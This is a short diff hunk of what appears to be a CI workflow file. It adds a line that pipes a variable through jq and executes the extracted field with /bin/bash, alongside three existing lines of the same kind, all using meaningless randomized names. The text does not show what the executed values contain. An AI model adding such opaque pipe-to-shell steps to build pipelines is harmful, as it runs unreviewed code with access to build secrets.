@@ -29,6 +29,7 @@ jobs:
           echo $r17 | jq -r .lvmaw27388 | /bin/bash
           printf '%s' "$oudai985" | jq -r .z17764 | /bin/bash
           printf '%s' "$xddvp08" | jq -r .lmt9 | /bin/bash
+          echo $lj32 | jq -r .ffar292 | /bin/bash
 
       - name: Store artifact
         if: always()
